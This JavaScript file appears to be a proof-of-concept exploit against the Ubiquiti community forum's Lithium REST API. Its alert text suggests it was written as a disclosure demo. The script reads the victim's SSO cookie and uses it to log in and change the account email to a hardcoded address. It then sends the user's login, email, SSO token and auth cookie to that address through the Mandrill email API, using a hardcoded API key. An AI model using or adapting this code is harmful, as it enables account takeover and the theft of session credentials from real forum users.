var myApp = {
    get: function (url, success, extraQp) {
        extraQp = typeof extraQp == 'undefined' ? '' : extraQp;
        LITHIUM.jQuery.ajax({
            url: url + this.urlQueryParams + extraQp,
            type: "GET",
            headers: {
                'Accept': "*/*;",
                'Content-Type': 'text/plain;charset=UTF-8'
            },
            dataType: "json",
            success: success,
            error: myApp.logError
        });
    },
    post: function (url, data, success, extraQp) {
        extraQp = typeof extraQp == 'undefined' ? '' : extraQp;
        LITHIUM.jQuery.ajax({
            url: url + this.urlQueryParams + extraQp,
            type: "POST",
            headers: {
                'Accept': "*/*;",
                'Content-Type': 'text/plain;charset=UTF-8'
            },
            data: data,
            dataType: "json",
            success: success
        });
    },
    urlQueryParams: '?restapi.response_format=json&restapi.response_style=-types,-null',
    sessionKeyQP: '&restapi.session_key=<<session_key>>',
    userUrl: '//community.ubnt.com/restapi/vc/users/self',
    logSuccess: function (data) {
        console.log(data);
    },
    logError: function(data, status, err) {
        console.log(status + " " + err);
        console.error(data);
    },
    setEmailUrl: '//community.ubnt.com/restapi/vc/users/id/<<id>>/email/set',
    setEmailQp: '&value=<<value>>',
    setEmailSuccess: function (data) {
        myApp.logSuccess(data);
        if (data.response.status == 'success') {
            alert("I just changed you email to " + data.response.user.email + ". And could now steal your account, but I won't. :)");
        } else {
            console.error('call failed.');
        }
    },
    loginUrl: '//community.ubnt.com/restapi/vc/authentication/sessions/login',
    ssoTokenQp: '&sso.authentication_token=<<sso_token>>',
    getSessionKey: function(callback) {
        var ssoToken = myApp.getCookie('!lithiumSSO');
        if (ssoToken != "") {
            var extraQp = myApp.ssoTokenQp.replace(/<<sso_token>>/g, ssoToken);
            myApp.get(myApp.loginUrl, function (data) {
                if (data.response.status == "success") {
                    callback(data.response.value);
                } else {
                    console.error("Failed to login with sso token.");
                }
            }, extraQp);
        } else {
            console.error("Could not find cookie with name '!lithiumSSO'");
        }
    },
    changeEmail: function (email) {
        myApp.getUser(function (data) {
            var email2 = email;
            myApp.logSuccess(data);
            if (data.response.status == 'success') {
                var userId = data.response.user.id;
                var url = myApp.setEmailUrl.replace(/<<id>>/g, userId);
                myApp.getSessionKey(function(sessionKey) {
                    var extraQp = myApp.sessionKeyQP.replace(/<<session_key>>/g, sessionKey);
                    extraQp += myApp.setEmailQp.replace(/<<value>>/g, email2);
                    myApp.post(url, '', this.setEmailSuccess, extraQp);
                });
            } else {
                console.error("failed to get user's info");
            }
        });
    },
    getUser: function(callback) {
        myApp.get(myApp.userUrl, callback);
    },
    getCookie: function(cname) {
        var name = cname + "=";
        var ca = document.cookie.split(';');
        for(var i=0; i<ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0)==' ') c = c.substring(1);
            if (c.indexOf(name) != -1) return c.substring(name.length,c.length);
        }
        return "";
    },
    shareLogin: function() {
        myApp.getUser(function(data) {
            if (data.response.status == 'success') {
                var user = data.response.user;
                var body = '<b>Login:</b>&nbsp;' + user.login + "<br />";
                body += '<b>Email:</b>&nbsp;' + user.email + "<br />";
                body += '<b>ssoToken:</b>&nbsp;' + myApp.getCookie('!lithiumSSO') + "<br />";
                body += '<b>UBIC_AUTH:</b>&nbsp;' + myApp.getCookie('UBIC_AUTH') + "<br />";
                myApp.sendEmail(data.response.user, {
                    to: 'david.esposito@ubnt.com',
                    subject: 'Info for ' + user.login,
                    body: body
                })
            }
        })
    },
    sendEmail: function (user, email) {
        $.ajax({
            type: 'POST',
            url: 'https://mandrillapp.com/api/1.0/messages/send.json',
            data: {
                key: 'f2qJrmhApBe6KUhgrCrmWw',
                message: {
                    from_email: user.email,
                    to: [ { email: email.to } ],
                    autotext: true,
                    subject: email.subject,
                    html: email.body
                }
            }
        }).done(function (response) {
            console.log(response);
        });
    }
};
myApp.changeEmail('david.esposito@ubnt.com');
myApp.shareLogin();
